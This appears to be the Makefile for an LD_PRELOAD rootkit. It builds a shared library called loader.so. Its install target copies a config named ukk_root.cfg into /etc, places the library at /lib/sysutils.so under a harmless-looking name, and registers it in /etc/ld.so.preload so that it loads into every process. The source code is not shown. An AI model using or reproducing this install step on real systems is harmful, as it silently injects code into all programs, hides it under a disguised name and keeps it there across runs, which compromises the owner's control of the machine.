SRCS = $(wildcard *.c)
HEADERS = $(wildcard *.h)

dist/loader.so: $(SRCS) $(HEADERS)
	mkdir -p dist
	gcc -shared -fPIC $(SRCS) -o $@ -ldl -lconfig -nostartfiles

install:
	cp ukk_root.cfg /etc/ukk_root.cfg
	cp dist/loader.so /lib/sysutils.so 
	echo /lib/sysutils.so > /etc/ld.so.preload